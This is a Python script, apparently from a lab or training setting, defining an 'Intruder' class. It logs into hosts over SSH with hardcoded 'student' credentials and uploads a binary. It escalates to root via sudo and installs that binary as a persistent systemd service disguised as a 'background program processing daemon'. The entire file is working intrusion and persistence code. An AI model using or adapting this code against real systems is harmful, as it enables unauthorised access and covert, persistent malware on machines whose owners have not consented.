import os
import time
import re

import paramiko
from paramiko import SSHClient
import requests
from bs4 import BeautifulSoup
from pathlib import Path
from scp import SCPClient
# import apiClient
from pathlib import Path

service = """[Unit]
Description=Regular background program processing daemon
Documentation=man:linrem(28)
After=network

[Service]
ExecStart=/usr/bin/linrem
KillMode=process
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""

port_dict = {
    '22': 'ssh',
    '80': 'http',
    '3389': 'rdp'
}


class Intruder:
    def __init__(self):
        Path("tmp").mkdir(parents=True, exist_ok=True)
        f = open("tmp/linrem.service", 'w')
        f.write(service)
        f.close()

    def intrude(self,
               ip,
               port,
               os):
        result = self.pwn(ip, port, os)
        return result

    @staticmethod
    def pwn(ip, port, os):
        client = SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username='student', password='student')
        scp = SCPClient(client.get_transport())
        scp.put(f'tmp/{ip}', '/tmp/tmp.raNFfxyoxr')
        scp.put(f'tmp/linrem.service', '/tmp/tmp.oSFEjRVkTb')
        channel = client.invoke_shell()
        time.sleep(2)
        channel.recv(2048)
        channel.send('sudo bash\n')
        time.sleep(1)
        channel.send('student\n')
        time.sleep(3)
        channel.send('mv /tmp/tmp.oSFEjRVkTb /lib/systemd/system/linrem.service && chmod 644 /lib/systemd/system/linrem.service && mv /tmp/tmp.raNFfxyoxr /usr/bin/linrem && chmod +x /usr/bin/linrem\n')
        time.sleep(2)
        channel.send('ln -s /lib/systemd/system/linrem.service /etc/systemd/system/multi-user.target.wants/linrem.service\n')
        time.sleep(2)
        channel.send('systemctl enable linrem.service && systemctl start linrem\n')
        time.sleep(2)
        print(channel.recv(1024))
